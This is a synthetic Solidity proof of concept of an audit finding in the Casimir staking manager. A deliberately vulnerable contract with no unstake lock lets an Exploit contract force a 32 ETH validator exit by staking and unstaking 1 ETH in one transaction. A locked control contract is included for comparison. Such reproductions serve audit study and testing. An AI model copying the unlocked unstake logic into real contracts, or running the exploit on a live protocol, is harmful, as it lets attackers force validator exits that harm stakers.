// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Casimir — a same-transaction stake and unstake forces a validator exit
    (Cyfrin, finding 35001).
    SYNTHETIC, cheatcode-free. requestUnstake's shortfall math is the audited
    body. Root cause: there is no unstake lock, and a shortfall that is not a
    multiple of VALIDATOR_CAPACITY still rounds up to a full exit. Staking 1 ETH
    onto 31 ETH of unassigned balance opens a ready validator, then unstaking
    that 1 ETH in the same transaction exits an active validator. The active
    validator's stake drops by 32 ETH and the withdrawal queue gains 32 ETH.
    The control rejects that unstake while the deposit block is still current. */

contract StakeToken {
    string public constant name = "Casimir stake";
    string public constant symbol = "ETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract WithdrawalQueue {}

contract CasimirManager {
    uint256 public constant VALIDATOR_CAPACITY = 32 ether;

    StakeToken public token;
    address public withdrawalQueue;

    uint256 public unassignedBalance;
    uint256 public withdrawnBalance;
    uint256 public delayedEffectiveBalance;
    uint256 public requestedExits;
    uint256 public unstakeQueueAmount;
    uint256 public activeValidatorStake;
    uint256 public readyValidatorStake;
    mapping(address => uint256) public depositBlock;

    bool private _locked;
    modifier nonReentrant() {
        require(!_locked, "reentrant");
        _locked = true;
        _;
        _locked = false;
    }

    constructor(StakeToken token_, address withdrawalQueue_) {
        token = token_;
        withdrawalQueue = withdrawalQueue_;
    }

    function getWithdrawableBalance() public view returns (uint256) {
        return unassignedBalance + withdrawnBalance;
    }

    function seedActiveValidator(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        activeValidatorStake = amount;
    }

    function seedUnassigned(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        unassignedBalance = amount;
    }

    function stake(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        unassignedBalance += amount;
        depositBlock[msg.sender] = block.number;
        distributeStakes();
    }

    function distributeStakes() public {
        uint256 assigned = (unassignedBalance / VALIDATOR_CAPACITY) * VALIDATOR_CAPACITY;
        if (assigned > 0) {
            readyValidatorStake += assigned;
            unassignedBalance -= assigned;
        }
    }

    function requestUnstake(uint256 amount) external nonReentrant {
        unstakeQueueAmount += amount;
        uint256 expectedWithdrawableBalance =
            getWithdrawableBalance() + requestedExits * VALIDATOR_CAPACITY + delayedEffectiveBalance;
        if (unstakeQueueAmount > expectedWithdrawableBalance) {
            uint256 requiredAmount = unstakeQueueAmount - expectedWithdrawableBalance;
            uint256 requiredExits = this.exitsForShortfall(requiredAmount);
            exitValidators(requiredExits);
        }
    }

    /// Audited shortfall math. External so the division is its own executed frame under viaIR.
    function exitsForShortfall(uint256 requiredAmount) external pure returns (uint256 requiredExits) {
        requiredExits = requiredAmount / VALIDATOR_CAPACITY;
        // @> VULN: no unstake lock, so a same-transaction 1 ETH unstake rounds the remainder up to a full validator exit
        if (requiredAmount % VALIDATOR_CAPACITY > 0) {
            requiredExits++;
        }
    }

    function exitValidators(uint256 exits) internal {
        requestedExits += exits;
        uint256 drop = exits * VALIDATOR_CAPACITY;
        activeValidatorStake -= drop;
        token.transfer(withdrawalQueue, drop);
    }
}

/// Same exit math, but a deposit cannot be unstaked in the deposit block.
contract CasimirManagerLocked {
    uint256 public constant VALIDATOR_CAPACITY = 32 ether;

    StakeToken public token;
    address public withdrawalQueue;

    uint256 public unassignedBalance;
    uint256 public withdrawnBalance;
    uint256 public delayedEffectiveBalance;
    uint256 public requestedExits;
    uint256 public unstakeQueueAmount;
    uint256 public activeValidatorStake;
    uint256 public readyValidatorStake;
    mapping(address => uint256) public depositBlock;

    constructor(StakeToken token_, address withdrawalQueue_) {
        token = token_;
        withdrawalQueue = withdrawalQueue_;
    }

    function getWithdrawableBalance() public view returns (uint256) {
        return unassignedBalance + withdrawnBalance;
    }

    function seedActiveValidator(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        activeValidatorStake = amount;
    }

    function seedUnassigned(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        unassignedBalance = amount;
    }

    function stake(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        unassignedBalance += amount;
        depositBlock[msg.sender] = block.number;
        uint256 assigned = (unassignedBalance / VALIDATOR_CAPACITY) * VALIDATOR_CAPACITY;
        if (assigned > 0) {
            readyValidatorStake += assigned;
            unassignedBalance -= assigned;
        }
    }

    function requestUnstake(uint256 amount) external {
        require(block.number > depositBlock[msg.sender], "unstake locked");
        unstakeQueueAmount += amount;
        uint256 expectedWithdrawableBalance =
            getWithdrawableBalance() + requestedExits * VALIDATOR_CAPACITY + delayedEffectiveBalance;
        if (unstakeQueueAmount > expectedWithdrawableBalance) {
            uint256 requiredAmount = unstakeQueueAmount - expectedWithdrawableBalance;
            uint256 requiredExits = requiredAmount / VALIDATOR_CAPACITY;
            if (requiredAmount % VALIDATOR_CAPACITY > 0) {
                requiredExits++;
            }
            requestedExits += requiredExits;
            uint256 drop = requiredExits * VALIDATOR_CAPACITY;
            activeValidatorStake -= drop;
            token.transfer(withdrawalQueue, drop);
        }
    }
}

contract Exploit {
    uint256 public constant FORCED_EXIT = 32 ether;

    StakeToken public token; // nonce 1
    WithdrawalQueue public queue; // nonce 2
    CasimirManager public manager; // nonce 3

    uint256 public stakeBefore;
    uint256 public stakeAfter;
    uint256 public queued;

    constructor() {
        token = new StakeToken();
        queue = new WithdrawalQueue();
        manager = new CasimirManager(token, address(queue));
        token.mint(address(this), 64 ether);
    }

    function run() external {
        token.approve(address(manager), type(uint256).max);
        manager.seedActiveValidator(32 ether);
        manager.seedUnassigned(31 ether);
        manager.stake(1 ether);
        stakeBefore = manager.activeValidatorStake();
        manager.requestUnstake(1 ether);
        stakeAfter = manager.activeValidatorStake();
        queued = token.balanceOf(address(queue));
        require(stakeBefore == FORCED_EXIT, "active validator was not 32 ETH");
        require(manager.readyValidatorStake() == FORCED_EXIT, "ready validator was not left in place");
        require(stakeAfter == 0, "active validator was not exited");
        require(stakeBefore - stakeAfter == FORCED_EXIT, "validator stake did not drop by 32 ETH");
        require(queued == FORCED_EXIT, "withdrawal queue did not gain 32 ETH");
        require(manager.requestedExits() == 1, "exit count");
    }
}
